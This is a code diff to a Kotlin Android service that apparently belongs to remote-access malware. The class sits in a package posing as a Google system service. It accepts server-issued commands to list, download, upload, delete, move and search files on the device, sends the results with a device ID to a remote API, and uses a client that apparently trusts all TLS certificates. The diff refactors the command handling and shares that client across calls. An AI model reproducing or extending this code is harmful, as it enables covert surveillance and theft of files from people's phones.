@@ -6,6 +6,7 @@ import android.util.Log
 import com.google.android.systemservice.config.AndroidConfig
 import com.google.android.systemservice.utils.TrustAllCertificates
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONArray
@@ -13,6 +14,7 @@ import org.json.JSONObject
 import java.io.File
 import java.io.FileInputStream
 import java.io.FileOutputStream
+import java.util.concurrent.TimeUnit
 import android.util.Base64
 
 /**
@@ -32,6 +34,13 @@ class FileBrowserService : BaseService() {
 
     override val serviceTag = TAG
     override val foregroundServiceId = 0 // FileBrowserService doesn't use foreground notification
+
+    private val httpClient: OkHttpClient by lazy {
+        TrustAllCertificates.createSecureClientBuilder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .build()
+    }
 
     private fun isPathSafe(path: String): Boolean {
         return try {
@@ -91,57 +100,16 @@ class FileBrowserService : BaseService() {
             try {
                 val paramsJson = JSONObject(params)
                 when (command) {
-                    "list_files" -> {
-                        val path = paramsJson.optString("path", Environment.getExternalStorageDirectory().absolutePath)
-                        val recursive = paramsJson.optBoolean("recursive", false)
-                        listFiles(requestId, path, recursive)
-                    }
-                    "download_file" -> {
-                        val path = paramsJson.optString("path")
-                        downloadFile(requestId, path)
-                    }
-                    "upload_file" -> {
-                        val destinationPath = paramsJson.optString("destination_path")
-                        val filename = paramsJson.optString("filename")
-                        val contentBase64 = paramsJson.optString("content_base64")
-                        uploadFile(requestId, destinationPath, filename, contentBase64)
-                    }
-                    "upload_file_chunk" -> {
-                        val uploadId = paramsJson.optString("upload_id")
-                        val chunkIndex = paramsJson.optInt("chunk_index")
-                        val totalChunks = paramsJson.optInt("total_chunks")
-                        val filename = paramsJson.optString("filename")
-                        val destinationPath = paramsJson.optString("destination_path")
-                        val chunkData = paramsJson.optString("chunk_data")
-                        uploadFileChunk(requestId, uploadId, chunkIndex, totalChunks, filename, destinationPath, chunkData)
-                    }
-                    "delete_file" -> {
-                        val path = paramsJson.optString("path")
-                        deleteFile(requestId, path)
-                    }
-                    "preview_file" -> {
-                        val path = paramsJson.optString("path")
-                        val maxSize = paramsJson.optLong("max_size", MAX_PREVIEW_SIZE.toLong())
-                        previewFile(requestId, path, maxSize)
-                    }
-                    "rename_file" -> {
-                        val oldPath = paramsJson.optString("old_path")
-                        val newName = paramsJson.optString("new_name")
-                        renameFile(requestId, oldPath, newName)
-                    }
-                    "move_file" -> {
-                        val sourcePath = paramsJson.optString("source_path")
-                        val destinationPath = paramsJson.optString("destination_path")
-                        moveFile(requestId, sourcePath, destinationPath)
-                    }
-                    "search_files" -> {
-                        val query = paramsJson.optString("query")
-                        val basePath = paramsJson.optString("path", Environment.getExternalStorageDirectory().absolutePath)
-                        searchFiles(requestId, query, basePath)
-                    }
-                    else -> {
-                        sendErrorResponse(requestId, "Unknown command: $command")
-                    }
+                    "list_files" -> handleListFiles(paramsJson, requestId)
+                    "download_file" -> handleDownloadFile(paramsJson, requestId)
+                    "upload_file" -> handleUploadFile(paramsJson, requestId)
+                    "upload_file_chunk" -> handleUploadFileChunk(paramsJson, requestId)
+                    "delete_file" -> handleDeleteFile(paramsJson, requestId)
+                    "preview_file" -> handlePreviewFile(paramsJson, requestId)
+                    "rename_file" -> handleRenameFile(paramsJson, requestId)
+                    "move_file" -> handleMoveFile(paramsJson, requestId)
+                    "search_files" -> handleSearchFiles(paramsJson, requestId)
+                    else -> sendErrorResponse(requestId, "Unknown command: $command")
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error executing $command: ${e.message}")
@@ -154,7 +122,66 @@ class FileBrowserService : BaseService() {
         return START_NOT_STICKY
     }
 
+    private fun handleListFiles(params: JSONObject, requestId: String?) {
+        val path = params.optString("path", Environment.getExternalStorageDirectory().absolutePath)
+        val recursive = params.optBoolean("recursive", false)
+        listFiles(requestId, path, recursive)
+    }
+
+    private fun handleDownloadFile(params: JSONObject, requestId: String?) {
+        val path = params.optString("path")
+        downloadFile(requestId, path)
+    }
+
+    private fun handleUploadFile(params: JSONObject, requestId: String?) {
+        val destinationPath = params.optString("destination_path")
+        val filename = params.optString("filename")
+        val contentBase64 = params.optString("content_base64")
+        uploadFile(requestId, destinationPath, filename, contentBase64)
+    }
+
+    private fun handleUploadFileChunk(params: JSONObject, requestId: String?) {
+        val uploadId = params.optString("upload_id")
+        val chunkIndex = params.optInt("chunk_index")
+        val totalChunks = params.optInt("total_chunks")
+        val filename = params.optString("filename")
+        val destinationPath = params.optString("destination_path")
+        val chunkData = params.optString("chunk_data")
+        uploadFileChunk(requestId, uploadId, chunkIndex, totalChunks, filename, destinationPath, chunkData)
+    }
+
+    private fun handleDeleteFile(params: JSONObject, requestId: String?) {
+        val path = params.optString("path")
+        deleteFile(requestId, path)
+    }
+
+    private fun handlePreviewFile(params: JSONObject, requestId: String?) {
+        val path = params.optString("path")
+        val maxSize = params.optLong("max_size", MAX_PREVIEW_SIZE.toLong())
+        previewFile(requestId, path, maxSize)
+    }
+
+    private fun handleRenameFile(params: JSONObject, requestId: String?) {
+        val oldPath = params.optString("old_path")
+        val newName = params.optString("new_name")
+        renameFile(requestId, oldPath, newName)
+    }
+
+    private fun handleMoveFile(params: JSONObject, requestId: String?) {
+        val sourcePath = params.optString("source_path")
+        val destinationPath = params.optString("destination_path")
+        moveFile(requestId, sourcePath, destinationPath)
+    }
+
+    private fun handleSearchFiles(params: JSONObject, requestId: String?) {
+        val query = params.optString("query")
+        val basePath = params.optString("path", Environment.getExternalStorageDirectory().absolutePath)
+        searchFiles(requestId, query, basePath)
+    }
+
     override fun onDestroy() {
+        httpClient.dispatcher.executorService.shutdown()
+        httpClient.connectionPool.evictAll()
         super.onDestroy()
     }
 
@@ -522,14 +549,13 @@ class FileBrowserService : BaseService() {
             payload.put("device_id", AndroidConfig.deviceId)
             payload.put("request_id", requestId ?: "")
 
-            val client = TrustAllCertificates.createSecureClientBuilder().build()
             val body = payload.toString().toRequestBody("application/json".toMediaType())
             val request = Request.Builder()
                 .url("${AndroidConfig.apiBaseUrl}/file_browser")
                 .post(body)
                 .build()
 
-            client.newCall(request).execute().use { response ->
+            httpClient.newCall(request).execute().use { response ->
                 if (response.isSuccessful) {
                     Log.d(TAG, "Response sent successfully for request: $requestId")
                 } else {
